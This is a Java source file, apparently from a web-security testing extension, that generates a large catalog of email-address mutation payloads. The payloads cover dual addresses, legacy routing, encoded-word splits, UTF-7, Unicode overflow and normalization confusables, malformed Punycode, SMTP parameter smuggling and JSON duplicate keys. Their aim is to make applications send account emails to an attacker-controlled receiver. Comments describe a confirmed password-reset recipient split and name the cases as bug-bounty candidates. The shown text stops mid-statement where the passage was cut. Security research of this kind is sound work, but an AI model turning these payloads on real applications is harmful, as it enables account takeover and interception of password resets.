package com.emailatomizer;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

public final class MutationCatalog {
    private MutationCatalog() {}

    public static List<MutationCase> all() {
        List<MutationCase> out = new ArrayList<>();

        out.add(m("BASE-001", "Baseline", "Canonical unchanged",
                "HTTP/application control. Leaves the configured address unchanged.", false,
                c -> c.canonicalEmail()));

        out.add(m("BASE-002", "Baseline", "Direct probe receiver",
                "Direct receiver control. Uses Collaborator by default, or the controlled mailbox selected in Test Builder.", true,
                c -> c.receiverEmail()));

        out.add(m("RFC-001", "RFC parser probes", "Quoted local-part contains @",
                "Tests disagreement over quoted local-part boundaries.", true,
                c -> "\"" + c.receiverEmail() + "\"@" + c.allowedDomain()));
        out.add(m("RFC-002", "RFC parser probes", "Comment before local-part",
                "Tests CFWS/comment handling around the local-part.", true,
                c -> "(" + c.receiverEmail() + ")" + c.localPart() + "@" + c.allowedDomain()));
        out.add(m("RFC-003", "RFC parser probes", "Comments around domain",
                "Tests differences in comment stripping before domain-based authorization.", false,
                c -> "(atom)" + c.localPart() + "@(x)" + c.allowedDomain()));
        out.add(m("RFC-004", "RFC parser probes", "Escaped quote in quoted local-part",
                "Tests quoted-pair handling in validators and downstream mail libraries.", true,
                c -> "\"" + c.receiverLocalPart() + "\\\"@" + c.receiverDomain() + "\"@" + c.allowedDomain()));

        // Two-address role probes deliberately place the application identity address and a controlled
        // receiver address in the same value. They are useful for detecting parsers that choose
        // different addresses at validation/account-binding and delivery time.
        out.add(m("DUAL-001", "Two competing addresses in one field", "Identity, receiver",
                "Comma-separated pair with the application identity first and controlled receiver second.", true,
                c -> c.canonicalEmail() + "," + c.receiverEmail()));
        out.add(m("DUAL-002", "Two competing addresses in one field", "Receiver, identity",
                "Comma-separated pair with controlled receiver first and application identity second.", true,
                c -> c.receiverEmail() + "," + c.canonicalEmail()));
        out.add(m("DUAL-003", "Two competing addresses in one field", "Identity; receiver",
                "Semicolon-separated pair with identity first.", true,
                c -> c.canonicalEmail() + ";" + c.receiverEmail()));
        out.add(m("DUAL-004", "Two competing addresses in one field", "Receiver; identity",
                "Semicolon-separated pair with controlled receiver first.", true,
                c -> c.receiverEmail() + ";" + c.canonicalEmail()));
        out.add(m("DUAL-005", "Two competing addresses in one field", "Identity space receiver",
                "Whitespace-separated pair for loose tokenizers.", true,
                c -> c.canonicalEmail() + " " + c.receiverEmail()));
        out.add(m("DUAL-006", "Two competing addresses in one field", "Receiver space identity",
                "Whitespace-separated reverse pair for loose tokenizers.", true,
                c -> c.receiverEmail() + " " + c.canonicalEmail()));
        out.add(m("DUAL-007", "Two competing addresses in one field", "Identity display-name, receiver mailbox",
                "Puts the identity-looking address in display-name position and the controlled receiver in mailbox position.", true,
                c -> "\"" + c.canonicalEmail() + "\" <" + c.receiverEmail() + ">"));
        out.add(m("DUAL-008", "Two competing addresses in one field", "Receiver display-name, identity mailbox",
                "Reverse display-name/mailbox role probe.", true,
                c -> "\"" + c.receiverEmail() + "\" <" + c.canonicalEmail() + ">"));
        out.add(m("DUAL-009", "Two competing addresses in one field", "Identity <receiver>",
                "Unquoted identity-looking display-name with controlled receiver mailbox.", true,
                c -> c.canonicalEmail() + " <" + c.receiverEmail() + ">"));
        out.add(m("DUAL-010", "Two competing addresses in one field", "Receiver <identity>",
                "Reverse unquoted display-name/mailbox role probe.", true,
                c -> c.receiverEmail() + " <" + c.canonicalEmail() + ">"));
        out.add(m("DUAL-011", "Two competing addresses in one field", "<identity>, <receiver>",
                "Angle-bracketed address list with identity first.", true,
                c -> "<" + c.canonicalEmail() + ">,<" + c.receiverEmail() + ">"));
        out.add(m("DUAL-012", "Two competing addresses in one field", "<receiver>, <identity>",
                "Angle-bracketed reverse address list.", true,
                c -> "<" + c.receiverEmail() + ">,<" + c.canonicalEmail() + ">"));

        out.add(m("ROUTE-001", "Legacy routing", "UUCP bang path",
                "Sendmail-style bang-path confusion described in the research.", true,
                c -> c.receiverDomain() + "!" + c.receiverLocalPart() + "\\@" + c.allowedDomain()));
        out.add(m("ROUTE-002", "Legacy routing", "Quoted UUCP + comment",
                "Quoted/comment variation of bang-path parsing.", true,
                c -> "\"" + c.receiverDomain() + "!" + c.receiverLocalPart() + "\"(\\\"@" + c.allowedDomain()));
        out.add(m("ROUTE-003", "Legacy routing", "Percent hack",
                "Tests percent-routing behavior where a downstream MTA may reinterpret % as @.", true,
                c -> c.receiverLocalPart() + "%" + c.receiverDomain() + "@" + c.allowedDomain()));
        out.add(m("ROUTE-004", "Legacy routing", "Percent hack + open comment",
                "Postfix/source-route style variation from the research.", true,
                c -> c.receiverLocalPart() + "%" + c.receiverDomain() + "(@" + c.allowedDomain()));
        out.add(m("ROUTE-005", "Legacy routing", "Percent hack + address literal",
                "Tests source-route behavior using square-bracket domain syntax.", true,
                c -> c.receiverLocalPart() + "%" + c.receiverDomain() + "@[127.0.0.1]"));

        out.add(m("EW-PROBE-001", "Encoded-word", "UTF-8 Q probe",
                "Probes RFC 2047 encoded-word decoding while routing directly to the selected receiver target.", true,
                c -> "=?utf-8?q?" + c.receiverLocalPartQEncoded() + "?=@" + c.receiverDomain()));
        out.add(m("EW-PROBE-002", "Encoded-word", "ISO-8859-1 Q probe",
                "Alternate common charset probe for encoded-word support.", true,
                c -> "=?iso-8859-1?q?" + c.receiverLocalPartQEncoded() + "?=@" + c.receiverDomain()));
        out.add(m("EW-PROBE-003", "Encoded-word", "UTF-8 Base64 probe",
                "Probes Base64 encoded-word decoding.", true,
                c -> "=?utf-8?b?" + c.receiverLocalPartBase64() + "?=@" + c.receiverDomain()));

        int[] controls = {
                0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x07, 0x08,
                0x0e, 0x0f, 0x10, 0x11, 0x13, 0x15, 0x16, 0x17,
                0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1f, 0x20
        };
        int n = 1;
        for (int control : controls) {
            String hex = String.format("%02x", control);
            String id = String.format("EW-X-%03d", n++);
            out.add(m(id, "Encoded-word split (x charset)", "Q split + 0x" + hex,
                    "Mirrors the research Turbo Intruder split-fuzzing shape using the compact x charset.", true,
                    c -> "=?x?q?" + c.receiverLocalPartQEncoded() + "=40" + c.receiverDomain() + "=3e=" + hex + "?=foo@" + c.allowedDomain()));
        }
        out.add(m("EW-X-100", "Encoded-word split (x charset)", "Q split + comma",
                "Research-style encoded comma boundary using the compact x charset.", true,
                c -> "=?x?q?" + c.receiverLocalPartQEncoded() + "=40" + c.receiverDomain() + "=2c?=x@" + c.allowedDomain()));

        n = 1;
        for (int control : controls) {
            String hex = String.format("%02x", control);
            String id = String.format("EW-ISO-%03d", n++);
            out.add(m(id, "Encoded-word split (ISO-8859-1)", "Q split + 0x" + hex,
                    "Same split probe with a commonly accepted real charset for targets that reject the research's x charset.", true,
                    c -> "=?iso-8859-1?q?" + c.receiverLocalPartQEncoded() + "=40" + c.receiverDomain() + "=3e=" + hex + "?=foo@" + c.allowedDomain()));
        }
        out.add(m("EW-ISO-100", "Encoded-word split (ISO-8859-1)", "Q split + comma",
                "Encoded comma boundary using ISO-8859-1.", true,
                c -> "=?iso-8859-1?q?" + c.receiverLocalPartQEncoded() + "=40" + c.receiverDomain() + "=2c?=x@" + c.allowedDomain()));

        out.add(m("UTF7-001", "Encoded-word UTF-7", "UTF-7 Q @ + comma",
                "Combines encoded-word parsing with UTF-7 transformations for @ and comma.", true,
                c -> "=?utf-7?q?" + c.receiverLocalPart() + "&AEA-" + c.receiverDomain() + "&ACw-?=foo@" + c.allowedDomain()));
        out.add(m("UTF7-002", "Encoded-word UTF-7", "UTF-7 Q @ + comma terminator variation",
                "Published Turbo Intruder variation that perturbs the UTF-7 comma terminator.", true,
                c -> "=?utf-7?q?" + c.receiverLocalPart() + "&AEA-" + c.receiverDomain() + "&ACw=/xyz!-?=foo@" + c.allowedDomain()));
        out.add(m("UTF7-006", "Encoded-word UTF-7", "UTF-7 Q @ + space",
                "Combines encoded-word parsing with UTF-7 transformations for @ and space.", true,
                c -> "=?utf-7?q?" + c.receiverLocalPart() + "&AEA-" + c.receiverDomain() + "&ACA-?=foo@" + c.allowedDomain()));
        out.add(m("UTF7-007", "Encoded-word UTF-7", "UTF-7 Q @ + space terminator variation",
                "Published Turbo Intruder variation that perturbs the UTF-7 space terminator.", true,
                c -> "=?utf-7?q?" + c.receiverLocalPart() + "&AEA-" + c.receiverDomain() + "&ACA=/xyz!-?=foo@" + c.allowedDomain()));
        out.add(m("UTF7-003", "Encoded-word UTF-7", "Q-encoded UTF-7 metacharacters + comma",
                "Adds Q-encoding around UTF-7 metacharacters to test layered decoding.", true,
                c -> "=?utf-7?q?" + c.receiverLocalPart() + "=26AEA-" + c.receiverDomain() + "=26ACw-?=foo@" + c.allowedDomain()));
        out.add(m("UTF7-004", "Encoded-word UTF-7", "Q-encoded UTF-7 metacharacters + space",
                "Layered UTF-7/Q-encoding variation using a space boundary.", true,
                c -> "=?utf-7?q?" + c.receiverLocalPart() + "=26AEA-" + c.receiverDomain() + "=26ACA-?=foo@" + c.allowedDomain()));
        out.add(m("UTF7-005", "Encoded-word UTF-7", "Mixed Base64 UTF-7 separators",
                "Uses Base64 encoded-word fragments for UTF-7 @/comma sequences.", true,
                c -> c.receiverLocalPart() + "=?utf-7?b?JkFFQS0?=" + c.receiverDomain() + "=?utf-7?b?JkFDdy0?=foo@" + c.allowedDomain()));
        out.add(m("EW-B64-001", "Encoded-word", "Base64 encoded @ and comma (x charset)",
                "Published split-fuzzing shape using separate Base64 encoded-word fragments.", true,
                c -> c.receiverLocalPart() + "=?x?b?QA==?=" + c.receiverDomain() + "=?x?b?LA==?=foo@" + c.allowedDomain()));

        out.add(m("UNICODE-001", "Unicode overflow", "Overflow @ probe (U+2740)",
                "Places a code point whose value mod 256 is '@' in the local-part before the selected receiver domain.", true,
                c -> c.receiverLocalPart() + "❀" + c.receiverDomain() + "@" + c.allowedDomain()));
        out.add(m("UNICODE-002", "Unicode overflow", "Overflow > probe (U+273E)",
                "Combines overflow candidates for @ and > to probe lossy byte conversions.", true,
                c -> c.receiverLocalPart() + "❀" + c.receiverDomain() + "✾foo@" + c.allowedDomain()));
        out.add(m("UNICODE-003", "Unicode overflow", "Overflow comma probe",
                "Uses U+272C whose low byte is comma after a lossy modulo-256 conversion.", true,
                c -> c.receiverLocalPart() + "❀" + c.receiverDomain() + "✬foo@" + c.allowedDomain()));

        int[] overflowBases = {0x100, 0x200, 0x1000, 0x2700, 0x10000};
        int overflowN = 10;
        for (int base : overflowBases) {
            int cp = base + 0x40;
            if (cp <= Character.MAX_CODE_POINT) {
                String ch = new String(Character.toChars(cp));
                String id = String.format("UNICODE-%03d", overflowN++);
                out.add(m(id, "Unicode overflow", String.format("Overflow @ U+%04X", cp),
                        "Generates an @ candidate by adding 0x40 to a higher Unicode boundary, following the research's modulo-256 strategy.", true,
                        c -> c.receiverLocalPart() + ch + c.receiverDomain() + "@" + c.allowedDomain()));
            }
        }

        out.add(m("SMTP-001", "SMTP parameter ambiguity", "ORCPT-style quoted smuggling",
                "Tests the ORCPT-style SMTP optional-parameter ambiguity described in the research.", true,
                c -> "\"foo\\\\\"@" + c.receiverDomain() + "> ORCPT=test;" + c.receiverLocalPart() + "\"@" + c.allowedDomain()));

        out.add(m("PUNY-001", "Malformed Punycode", "xn--0117 (@) probe",
                "Probe for buggy IDN decoders that can turn malformed Punycode into an additional @.", false,
                c -> c.localPart() + "@xn--0117." + c.allowedDomain()));
        out.add(m("PUNY-002", "Malformed Punycode", "xn--0049 (comma) probe",
                "Research-shaped malformed IDN sequence that produced a comma in the affected decoder.", false,
                c -> c.localPart() + "@" + c.allowedDomain() + ".com.xn--0049.com." + c.allowedDomain()));
        out.add(m("PUNY-003", "Malformed Punycode", "xn--024 (@) compact probe",
                "Compact malformed Punycode probe reported to decode to an additional @ in the affected library.", false,
                c -> c.localPart() + "@xn--024." + c.allowedDomain()));
        out.add(m("PUNY-004", "Malformed Punycode", "xn--42 (comma) compact probe",
                "Compact malformed Punycode probe reported to decode to a comma in the affected library.", false,
                c -> c.localPart() + "@xn--42." + c.allowedDomain()));


        // Unicode/IDNA normalization differential probes. These focus on cases where one layer may
        // compatibility-normalize an address for identity lookup while a downstream mail/IDNA layer
        // preserves or maps the supplied Unicode differently. The U+1D43 and U+2090 cases are kept
        // explicit because they produced an end-to-end password-reset recipient split during testing.
        out.add(m("NORM-001", "Unicode compatibility normalization", "Domain a -> U+1D43 modifier small a (confirmed differential)",
                "Replaces the first ASCII 'a' in the domain with ᵃ (U+1D43). High-priority compatibility-normalization differential probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ᵃ")));
        out.add(m("NORM-002", "Unicode compatibility normalization", "Domain a -> U+2090 subscript a (confirmed differential)",
                "Replaces the first ASCII 'a' in the domain with ₐ (U+2090). High-priority compatibility-normalization differential probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ₐ")));
        out.add(m("NORM-003", "Unicode compatibility normalization", "Domain a -> fullwidth a", "Compatibility-equivalent fullwidth Latin letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ａ")));
        out.add(m("NORM-004", "Unicode compatibility normalization", "Domain e -> modifier small e", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "e", "ᵉ")));
        out.add(m("NORM-005", "Unicode compatibility normalization", "Domain i -> superscript i", "Compatibility-equivalent superscript-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "i", "ⁱ")));
        out.add(m("NORM-006", "Unicode compatibility normalization", "Domain o -> modifier small o", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "o", "ᵒ")));
        out.add(m("NORM-007", "Unicode compatibility normalization", "Domain l -> modifier small l", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "l", "ˡ")));
        out.add(m("NORM-008", "Unicode compatibility normalization", "Domain l -> fullwidth l", "Fullwidth Latin compatibility probe; useful where identity lookup folds width.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "l", "ｌ")));
        out.add(m("NORM-009", "Unicode compatibility normalization", "Domain g -> modifier small g", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "g", "ᵍ")));
        out.add(m("NORM-010", "Unicode compatibility normalization", "Domain m -> modifier small m", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "m", "ᵐ")));
        out.add(m("NORM-011", "Unicode compatibility normalization", "Domain r -> modifier small r", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "r", "ʳ")));
        out.add(m("NORM-012", "Unicode compatibility normalization", "Domain s -> modifier small s", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "s", "ˢ")));
        out.add(m("NORM-013", "Unicode compatibility normalization", "Domain t -> modifier small t", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "t", "ᵗ")));
        out.add(m("NORM-014", "Unicode compatibility normalization", "Domain u -> modifier small u", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "u", "ᵘ")));
        out.add(m("NORM-015", "Unicode compatibility normalization", "Domain x -> modifier small x", "Compatibility-equivalent modifier-letter probe.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "x", "ˣ")));
        out.add(m("NORM-016", "Unicode compatibility normalization", "Local l -> fullwidth l", "Tests whether identity lookup folds a compatibility character in the local part while delivery preserves it.", false,
                c -> replaceFirstLocal(c, "l", "ｌ")));
        out.add(m("NORM-017", "Unicode compatibility normalization", "Local plus -> U+FE62 small plus", "Tests compatibility folding of the plus separator in a tagged local part.", false,
                c -> replaceFirstLocal(c, "+", "﹢")));
        out.add(m("NORM-018", "Unicode compatibility normalization", "Local a -> U+1D43 modifier small a", "Compatibility-normalization probe in the local part.", false,
                c -> replaceFirstLocal(c, "a", "ᵃ")));
        out.add(m("NORM-019", "Unicode compatibility normalization", "Local a -> U+2090 subscript a", "Compatibility-normalization probe in the local part.", false,
                c -> replaceFirstLocal(c, "a", "ₐ")));

        out.add(m("IDNA-001", "Unicode domain separators", "ASCII dot -> fullwidth full stop U+FF0E",
                "Replaces the first domain separator with U+FF0E to detect width-folding differences between account lookup and mail routing.", false,
                c -> replaceFirstDomainSeparator(c, "．")));
        out.add(m("IDNA-002", "Unicode domain separators", "ASCII dot -> ideographic full stop U+3002",
                "Tests IDNA handling of U+3002 as an alternate domain separator.", false,
                c -> replaceFirstDomainSeparator(c, "。")));
        out.add(m("IDNA-003", "Unicode domain separators", "ASCII dot -> halfwidth ideographic full stop U+FF61",
                "Tests IDNA handling of U+FF61 as an alternate domain separator.", false,
                c -> replaceFirstDomainSeparator(c, "｡")));
        out.add(m("IDNA-004", "Unicode IDNA mappings", "ss -> sharp s U+00DF",
                "Tests transitional/non-transitional IDNA disagreement around ß versus ss.", false,
                c -> replaceDomainSequence(c, "ss", "ß")));
        out.add(m("IDNA-005", "Unicode IDNA mappings", "sigma -> final sigma",
                "Tests normalization/casefold disagreement between Greek sigma σ and final sigma ς.", false,
                c -> replaceDomainSequence(c, "σ", "ς")));
        out.add(m("IDNA-006", "Unicode IDNA mappings", "Insert ZWNJ U+200C in first label",
                "Tests whether one layer removes or ignores ZERO WIDTH NON-JOINER while another preserves IDNA semantics.", false,
                c -> insertIntoFirstDomainLabel(c, "‌")));
        out.add(m("IDNA-007", "Unicode IDNA mappings", "Insert ZWJ U+200D in first label",
                "Tests whether one layer removes or ignores ZERO WIDTH JOINER while another preserves IDNA semantics.", false,
                c -> insertIntoFirstDomainLabel(c, "‍")));
        out.add(m("IDNA-008", "Unicode IDNA mappings", "e -> precomposed é",
                "Tests accidental accent-insensitive comparison versus IDNA-preserved Unicode routing.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "e", "é")));
        out.add(m("IDNA-009", "Unicode IDNA mappings", "e -> decomposed e + combining acute",
                "Tests NFC/NFD disagreement by replacing an ASCII e with e plus U+0301.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "e", "é")));
        out.add(m("IDNA-010", "Unicode confusables", "Latin a -> Cyrillic а U+0430",
                "Cross-script confusable control: should not compare equal under ordinary IDNA processing.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "а")));
        out.add(m("IDNA-011", "Unicode confusables", "Latin o -> Greek ο U+03BF",
                "Cross-script confusable control: should not compare equal under ordinary IDNA processing.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "o", "ο")));
        out.add(m("IDNA-012", "Unicode confusables", "Latin o -> Cyrillic о U+043E",
                "Cross-script confusable control: should not compare equal under ordinary IDNA processing.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "o", "о")));
        out.add(m("IDNA-013", "Unicode IDNA mappings", "Valid A-label for first Unicode-looking label",
                "Control probe using a literal xn-- label shape to compare Unicode-input and already-Punycoded behavior.", false,
                c -> c.localPart() + "@xn--n9f." + c.allowedDomain()));


        // Additional compatibility characters that commonly collapse under NFKC but may survive into
        // a different downstream IDN/mail interpretation.
        out.add(m("NORM-020", "Unicode compatibility normalization", "Domain a -> circled a U+24D0",
                "Tests compatibility folding of circled Latin letters.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ⓐ")));
        out.add(m("NORM-021", "Unicode compatibility normalization", "Domain a -> feminine ordinal U+00AA",
                "Tests a compatibility character whose NFKC form is ASCII a.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ª")));
        out.add(m("NORM-022", "Unicode compatibility normalization", "Domain a -> mathematical bold small a U+1D41A",
                "Astral-plane compatibility character; also useful for surrogate-pair transport tests.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "𝐚")));
        out.add(m("NORM-023", "Unicode compatibility normalization", "Domain s -> long s U+017F",
                "Tests NFKC/casefold behavior for long s.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "s", "ſ")));
        out.add(m("NORM-024", "Unicode compatibility normalization", "Domain k -> Kelvin sign U+212A",
                "Tests compatibility/casefold behavior for Kelvin sign versus ASCII k.", false,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "k", "K")));

        out.add(m("IDNA-014", "Unicode domain separators", "ASCII dot -> small full stop U+FE52",
                "Tests alternate Unicode separator handling.", false,
                c -> replaceFirstDomainSeparator(c, "﹒")));
        out.add(m("IDNA-015", "Unicode domain separators", "ASCII dot -> one dot leader U+2024",
                "Tests normalization of U+2024 versus ASCII full stop.", false,
                c -> replaceFirstDomainSeparator(c, "․")));
        out.add(m("IDNA-016", "Unicode address separators", "ASCII @ -> fullwidth @ U+FF20",
                "Tests whether one layer compatibility-folds the address separator while another rejects or preserves it.", false,
                c -> c.localPart() + "＠" + c.allowedDomain()));
        out.add(m("IDNA-017", "Unicode address separators", "ASCII @ -> small @ U+FE6B",
                "Tests compatibility folding of the at-sign separator.", false,
                c -> c.localPart() + "﹫" + c.allowedDomain()));

        // Raw Punycode A-label counterparts intentionally skip Nameprep/NFKC so compatibility
        // characters can be compared as distinct DNS labels. This is useful for identifying
        // legacy/raw-Punycode versus normalization-first implementation differences.
        out.add(m("ALABEL-001", "Raw Punycode A-label counterparts", "U+1D43 domain -> raw xn-- A-label",
                "Raw RFC 3492 A-label counterpart of NORM-001 for U-label/A-label differential testing.", false,
                c -> rawALabelForReplacement(c, "a", "ᵃ")));
        out.add(m("ALABEL-002", "Raw Punycode A-label counterparts", "U+2090 domain -> raw xn-- A-label",
                "Raw RFC 3492 A-label counterpart of NORM-002.", false,
                c -> rawALabelForReplacement(c, "a", "ₐ")));
        out.add(m("ALABEL-003", "Raw Punycode A-label counterparts", "Cyrillic a domain -> xn-- A-label",
                "A-label control for a genuinely distinct cross-script Unicode label.", false,
                c -> rawALabelForReplacement(c, "a", "а")));
        out.add(m("ALABEL-004", "Raw Punycode A-label counterparts", "Greek omicron domain -> xn-- A-label",
                "A-label control for a genuinely distinct Greek confusable.", false,
                c -> rawALabelForReplacement(c, "o", "ο")));

        // True JSON wire mutations. These are not display encodings: RequestMutator emits the escape
        // sequences literally in the HTTP request body and skips the case on non-JSON targets.
        out.add(mw("JSON-WIRE-001", "JSON wire Unicode", "U+1D43 as JSON Unicode escape on wire",
                "Same logical address as NORM-001, but the non-ASCII code point is represented as a JSON Unicode escape on the wire.", false,
                MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ᵃ")));
        out.add(mw("JSON-WIRE-002", "JSON wire Unicode", "U+2090 as JSON Unicode escape on wire",
                "Same logical address as NORM-002 with JSON Unicode escaping preserved on the wire.", false,
                MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ₐ")));
        out.add(mw("JSON-WIRE-003", "JSON wire Unicode", "Fullwidth a as JSON Unicode escape on wire",
                "Width-folding case represented through JSON Unicode escaping.", false,
                MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ａ")));
        out.add(mw("JSON-WIRE-004", "JSON wire Unicode", "Unicode domain separator as JSON Unicode escape on wire",
                "Fullwidth domain separator represented as a JSON Unicode escape.", false,
                MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                c -> replaceFirstDomainSeparator(c, "．")));
        out.add(mw("JSON-WIRE-005", "JSON wire Unicode", "Decomposed acute as JSON Unicode escape on wire",
                "NFD-style domain mutation with combining mark encoded on the JSON wire.", false,
                MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "e", "é")));
        out.add(mw("JSON-WIRE-006", "JSON wire Unicode", "Astral overflow U+10040 as surrogate pair",
                "Serializes U+10040 as its JSON surrogate pair to compare with the raw UTF-8 UNICODE overflow case.", true,
                MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                c -> c.receiverLocalPart() + new String(Character.toChars(0x10040)) + c.receiverDomain() + "@" + c.allowedDomain()));
        out.add(mw("JSON-WIRE-007", "JSON wire syntax escapes", "ASCII @ as JSON Unicode escape",
                "Keeps the logical canonical email unchanged while encoding @ as a JSON Unicode escape.", false,
                MutationCase.WireMode.JSON_ESCAPE_AT, c -> c.canonicalEmail()));
        out.add(mw("JSON-WIRE-008", "JSON wire syntax escapes", "ASCII dot as JSON Unicode escape",
                "Keeps the logical email unchanged while encoding dots as JSON Unicode escapes.", false,
                MutationCase.WireMode.JSON_ESCAPE_DOT, c -> c.canonicalEmail()));
        out.add(mw("JSON-WIRE-009", "JSON wire syntax escapes", "ASCII plus as JSON Unicode escape",
                "Encodes plus-tag separators as JSON Unicode escapes when present.", false,
                MutationCase.WireMode.JSON_ESCAPE_PLUS, c -> c.canonicalEmail()));
        out.add(mw("JSON-WIRE-010", "JSON wire Unicode", "U+1D43 double-escaped backslash-u form",
                "Tests accidental second decoding: JSON parser receives a literal backslash-u sequence rather than U+1D43.", false,
                MutationCase.WireMode.JSON_DOUBLE_UNICODE_ESCAPED,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ᵃ")));
        out.add(mw("JSON-WIRE-011", "JSON wire Unicode", "U+2090 double-escaped backslash-u form",
                "Second-decoding control for U+2090.", false,
                MutationCase.WireMode.JSON_DOUBLE_UNICODE_ESCAPED,
                c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), "a", "ₐ")));

        out.add(mw("JSON-KEY-001", "JSON parser ambiguity", "duplicate key: identity then receiver",
                "Creates two equivalent literal JSON keys; identity value first, receiver value second.", true,
                MutationCase.WireMode.JSON_DUPLICATE_KEY_IDENTITY_FIRST, c -> c.receiverEmail()));
        out.add(mw("JSON-KEY-002", "JSON parser ambiguity", "duplicate key: receiver then identity",
                "Creates two equivalent literal JSON keys; receiver value first, identity value second.", true,
                MutationCase.WireMode.JSON_DUPLICATE_KEY_MUTATION_FIRST, c -> c.receiverEmail()));
        out.add(mw("JSON-KEY-003", "JSON parser ambiguity", "literal key identity then escaped-equivalent key receiver",
                "Pairs the original key with an escaped-equivalent key such as e\u006dail.", true,
                MutationCase.WireMode.JSON_ESCAPED_KEY_IDENTITY_FIRST, c -> c.receiverEmail()));
        out.add(mw("JSON-KEY-004", "JSON parser ambiguity", "receiver then escaped-equivalent key identity",
                "Reverse-order escaped-equivalent-key ambiguity probe.", true,
                MutationCase.WireMode.JSON_ESCAPED_KEY_MUTATION_FIRST, c -> c.receiverEmail()));


        // IDNA2008-focused bounty candidates. These use characters that are PVALID under IDNA2008
        // in ordinary non-leading positions. PVALID does NOT guarantee that a particular registry/TLD
        // will accept a label; registry language/script policy remains a separate constraint.
        //
        // The Latin-fold set is especially useful for real-domain PoCs because many applications
        // accidentally strip diacritics for identity matching while SMTP/IDNA preserves the U-label.
        // The selected letters intentionally cover common test labels such as gmail, yahoo, and
        // wearehackerone without exploding the full matrix into every accented Latin code point.
        String[][] pvalidLatin = {
                {"g", "ğ", "LATIN SMALL LETTER G WITH BREVE"},
                {"a", "á", "LATIN SMALL LETTER A WITH ACUTE"},
                {"a", "ä", "LATIN SMALL LETTER A WITH DIAERESIS"},
                {"i", "í", "LATIN SMALL LETTER I WITH ACUTE"},
                {"l", "ĺ", "LATIN SMALL LETTER L WITH ACUTE"},
                {"y", "ý", "LATIN SMALL LETTER Y WITH ACUTE"},
                {"h", "ĥ", "LATIN SMALL LETTER H WITH CIRCUMFLEX"},
                {"o", "ó", "LATIN SMALL LETTER O WITH ACUTE"},
                {"o", "ö", "LATIN SMALL LETTER O WITH DIAERESIS"},
                {"w", "ŵ", "LATIN SMALL LETTER W WITH CIRCUMFLEX"},
                {"e", "é", "LATIN SMALL LETTER E WITH ACUTE"},
                {"r", "ŕ", "LATIN SMALL LETTER R WITH ACUTE"},
                {"c", "ć", "LATIN SMALL LETTER C WITH ACUTE"},
                {"k", "ķ", "LATIN SMALL LETTER K WITH CEDILLA"},
                {"n", "ń", "LATIN SMALL LETTER N WITH ACUTE"}
        };
        for (int i = 0; i < pvalidLatin.length; i++) {
            final String from = pvalidLatin[i][0];
            final String to = pvalidLatin[i][1];
            final String unicodeName = pvalidLatin[i][2];
            final String suffix = String.format("%03d", i + 1);
            out.add(m("PVALID-LATIN-" + suffix, "IDNA2008 PVALID Latin folds",
                    "Domain " + from + " -> " + to + " (" + unicodeName + ")",
                    "IDNA2008-PVALID Latin-script candidate for detecting accent/diacritic-insensitive identity matching while delivery preserves an IDN label. Registry acceptance varies by TLD.",
                    false, c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), from, to)));
            out.add(mw("PVALID-LATIN-J-" + suffix, "IDNA2008 PVALID Latin folds JSON wire",
                    "Domain " + from + " -> " + to + " as JSON Unicode escape",
                    "Same PVALID Latin candidate with the Unicode code point represented as a JSON Unicode escape on the HTTP wire.",
                    false, MutationCase.WireMode.JSON_UNICODE_ESCAPED,
                    c -> replaceFirstOrAppend(c.localPart(), c.allowedDomain(), from, to)));
            out.add(m("PVALID-LATIN-A-" + suffix, "IDNA2008 PVALID A-label controls",
                    "A-label control for " + from + " -> " + to,
